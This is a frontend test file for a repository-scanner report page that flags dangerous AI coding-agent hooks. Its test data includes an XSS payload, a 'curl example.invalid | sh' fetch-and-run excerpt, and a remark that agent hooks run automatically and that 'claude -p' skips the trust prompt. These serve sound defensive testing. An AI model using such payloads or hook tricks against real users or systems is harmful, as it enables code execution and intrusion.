import { fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { ReportFindingView, ReportView } from "@/server/report-view";
import { saveExcerpts } from "./excerpt-store";
import { openingSteps } from "./guidance";
import { ReportDocument } from "./ReportDocument";

const REPORT_ID = "B".repeat(22);

const finding = (overrides: Partial<ReportFindingView> = {}): ReportFindingView => ({
  position: 0,
  ruleId: "AUTO-002",
  severity: "critical",
  title: "Agent hook reaches the network or runs a concealed script",
  why: "Hooks run automatically during agent work.",
  fix: "Remove the hook.",
  path: ".claude/settings.json",
  line: 7,
  permalink: "https://github.com/acme/app/blob/abc/.claude/settings.json#L7",
  ...overrides,
});

const baseReport = (overrides: Partial<ReportView> = {}): ReportView => ({
  id: REPORT_ID,
  repository: { owner: "acme", name: "app", url: "https://github.com/acme/app" },
  commit: {
    sha: "a".repeat(40),
    shortSha: "aaaaaaa",
    url: `https://github.com/acme/app/commit/${"a".repeat(40)}`,
  },
  scannedAt: "2026-11-22T08:30:00.000Z",
  rulesetVersion: "0.3.0",
  status: "dangerous",
  filesScanned: 4,
  noAgentFiles: false,
  impact: [
    {
      agent: "claude-code",
      impact: "runs_after_trust_prompt",
      findings: [
        {
          ruleId: "AUTO-002",
          path: ".claude/settings.json",
          line: 7,
          impact: "runs_after_trust_prompt",
          note: "Interactive sessions hold this back until you accept the trust dialog.",
          source: "https://code.claude.com/docs/en/hooks#workspace-trust",
        },
      ],
    },
    { agent: "cursor", impact: "not_detected", findings: [] },
    { agent: "vscode", impact: "not_detected", findings: [] },
    { agent: "antigravity-cli", impact: "not_detected", findings: [] },
    { agent: "gemini-cli", impact: "not_detected", findings: [] },
  ],
  findings: [finding()],
  skipped: [],
  packages: null,
  disclaimer: "These are automated review signals from static checks. They are not a guarantee.",
  ...overrides,
});

beforeEach(() => {
  window.sessionStorage.clear();
});

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("ReportDocument", () => {
  it("shows the repository, commit, time, ruleset, and verdict", () => {
    render(<ReportDocument report={baseReport()} />);
    expect(screen.getByRole("heading", { level: 1 }).textContent).toBe("acme/app");
    expect(screen.getByRole("link", { name: "aaaaaaa" }).getAttribute("href")).toContain(
      "/commit/",
    );
    expect(screen.getByText("Nov 22, 2026, 8:30 AM UTC")).toBeTruthy();
    expect(screen.getByText("v0.3.0")).toBeTruthy();
    expect(screen.getByText("Dangerous")).toBeTruthy();
  });

  it("puts Open Impact before the findings", () => {
    render(<ReportDocument report={baseReport()} />);
    const impact = screen.getByRole("heading", { name: "What happens in each agent" });
    const findings = screen.getByRole("heading", { name: "1 finding" });
    expect(impact.compareDocumentPosition(findings)).toBe(Node.DOCUMENT_POSITION_FOLLOWING);
  });

  it("lists all five agents with their impact", () => {
    render(<ReportDocument report={baseReport()} />);
    for (const name of ["Claude Code", "Cursor", "VS Code", "Antigravity CLI", "Gemini CLI"]) {
      expect(screen.getByText(name)).toBeTruthy();
    }
    expect(screen.getByText("Runs after trust prompt")).toBeTruthy();
    expect(screen.getAllByText("Not detected")).toHaveLength(4);
    expect(screen.getByRole("link", { name: "Official docs" }).getAttribute("href")).toContain(
      "code.claude.com",
    );
  });

  it("shows why, how to fix, and a commit permalink for each finding", () => {
    render(<ReportDocument report={baseReport()} />);
    expect(screen.getByText("Hooks run automatically during agent work.")).toBeTruthy();
    expect(screen.getByText("Remove the hook.")).toBeTruthy();
    const links = screen.getAllByRole("link", { name: ".claude/settings.json:7", hidden: true });
    expect(links.some((link) => link.getAttribute("href") === finding().permalink)).toBe(true);
  });

  it("opens external links without passing the page context", () => {
    const { container } = render(<ReportDocument report={baseReport()} />);
    const external = [...container.querySelectorAll('a[target="_blank"]')];
    expect(external.length).toBeGreaterThan(2);
    for (const link of external) {
      expect(link.getAttribute("rel")).toContain("noopener");
      expect(link.getAttribute("rel")).toContain("noreferrer");
    }
  });

  it("renders hostile repository data as plain text", () => {
    const payload = '<img src=x onerror="window.__xss=1"><script>window.__xss=1</script>';
    const report = baseReport({
      repository: { owner: "acme", name: payload, url: "https://github.com/acme/app" },
      findings: [finding({ path: payload })],
      skipped: [{ path: payload, reason: "Symbolic link" }],
    });
    saveExcerpts({ ...report, findings: [finding({ path: payload, excerpt: payload })] });

    const { container } = render(<ReportDocument report={report} />);
    expect(container.querySelector('img[src="x"]')).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.textContent).toContain("<img src=x");
    expect((window as unknown as { __xss?: number }).__xss).toBeUndefined();
  });

  it("uses the required wording for a clean result", () => {
    const disclaimer = "No issues found by ruleset v0.3.0. This is not a guarantee.";
    render(
      <ReportDocument
        report={baseReport({
          status: "no_issues_found",
          findings: [],
          impact: baseReport().impact.map((entry) => ({
            ...entry,
            impact: "not_detected",
            findings: [],
          })),
          disclaimer,
        })}
      />,
    );
    expect(screen.getAllByText(disclaimer).length).toBeGreaterThan(0);
    expect(screen.queryByText("Open this repo with less risk")).toBeNull();
  });

  it("explains a repository without agent files", () => {
    render(
      <ReportDocument
        report={baseReport({
          status: "no_issues_found",
          filesScanned: 0,
          noAgentFiles: true,
          findings: [],
          disclaimer: "No issues found by ruleset v0.3.0. This is not a guarantee.",
        })}
      />,
    );
    expect(screen.getByText(/no agent files for Hierophant to inspect/)).toBeTruthy();
  });

  it("says when part of a clean repo was not checked", () => {
    render(
      <ReportDocument
        report={baseReport({
          status: "no_issues_found",
          findings: [],
          skipped: [
            {
              path: ".",
              reason: "Only 29 of 200 agent files were checked because of a hosting limit",
            },
          ],
          disclaimer: "No issues found by ruleset v0.3.0. This is not a guarantee.",
        })}
      />,
    );
    expect(screen.getByText(/Part of this repo was not checked/)).toBeTruthy();
  });

  it("lists files that were not fully checked", () => {
    render(
      <ReportDocument
        report={baseReport({
          skipped: [
            { path: ".", reason: "The full file list was too large" },
            { path: "CLAUDE.md", reason: "Symbolic link" },
          ],
        })}
      />,
    );
    expect(screen.getByText("Files not fully checked (2)")).toBeTruthy();
    expect(screen.getByText("Repository")).toBeTruthy();
    expect(screen.getByText("Symbolic link")).toBeTruthy();
  });

  it("makes no safety claim", () => {
    const { container } = render(<ReportDocument report={baseReport()} />);
    expect(container.textContent).not.toMatch(/\b(?:is safe|secure|guaranteed)\b/i);
  });
});

describe("excerpts", () => {
  it("are hidden when this tab did not run the scan", () => {
    render(<ReportDocument report={baseReport()} />);
    expect(screen.queryByText(/visible only in this browser tab/)).toBeNull();
  });

  it("are shown after a scan in this tab", () => {
    const report = baseReport({ findings: [finding({ excerpt: "curl example.invalid | sh" })] });
    saveExcerpts(report);
    render(<ReportDocument report={baseReport()} />);
    expect(screen.getByText("curl example.invalid | sh")).toBeTruthy();
  });

  it("survive corrupted storage", () => {
    window.sessionStorage.setItem(`hierophant:excerpts:${REPORT_ID}`, "{not json");
    expect(() => render(<ReportDocument report={baseReport()} />)).not.toThrow();
  });
});

describe("copy link", () => {
  it("copies the report URL", async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    vi.stubGlobal("navigator", { ...navigator, clipboard: { writeText } });
    render(<ReportDocument report={baseReport()} />);
    fireEvent.click(screen.getByRole("button", { name: "Copy link" }));
    expect(await screen.findByRole("button", { name: "Link copied" })).toBeTruthy();
    expect(writeText).toHaveBeenCalledWith(window.location.href.split("#", 1)[0]);
  });

  it("says when copying fails", async () => {
    const writeText = vi.fn().mockRejectedValue(new Error("denied"));
    vi.stubGlobal("navigator", { ...navigator, clipboard: { writeText } });
    render(<ReportDocument report={baseReport()} />);
    fireEvent.click(screen.getByRole("button", { name: "Copy link" }));
    expect(await screen.findByRole("button", { name: "Copy failed" })).toBeTruthy();
  });
});

describe("false-positive reports", () => {
  const open = () => {
    render(<ReportDocument report={baseReport()} />);
    fireEvent.click(screen.getByRole("button", { name: "Report a false positive" }));
    return screen.getByRole("group", { name: "Why is this a false positive?" });
  };

  it("sends the chosen reason", async () => {
    const fetchMock = vi.fn().mockResolvedValue(Response.json({ ok: true }, { status: 201 }));
    vi.stubGlobal("fetch", fetchMock);
    const group = open();
    fireEvent.click(within(group).getByRole("button", { name: "Wrong file or line" }));

    expect(await screen.findByText("Thanks. Your report was recorded.")).toBeTruthy();
    const [url, init] = fetchMock.mock.calls[0] as [string, RequestInit];
    expect(url).toBe(`/api/reports/${REPORT_ID}/feedback`);
    expect(JSON.parse(init.body as string)).toEqual({ position: 0, reason: "wrong_location" });
  });

  it("shows an error and allows a retry", async () => {
    vi.stubGlobal("fetch", vi.fn().mockResolvedValue(new Response("{}", { status: 500 })));
    const group = open();
    fireEvent.click(within(group).getByRole("button", { name: "Wrong file or line" }));
    expect(await screen.findByRole("alert")).toBeTruthy();
    await waitFor(() =>
      expect(
        (screen.getByRole("button", { name: "Wrong file or line" }) as HTMLButtonElement).disabled,
      ).toBe(false),
    );
  });
});

describe("openingSteps", () => {
  it("adds advice only for affected agents", () => {
    const titles = openingSteps(baseReport()).map((step) => step.title);
    expect(titles).toContain("In Claude Code");
    expect(titles).not.toContain("In Cursor");
  });

  it("warns that claude -p skips the trust dialog", () => {
    const step = openingSteps(baseReport()).find((item) => item.title === "In Claude Code");
    expect(step?.body).toContain("claude -p");
  });
});
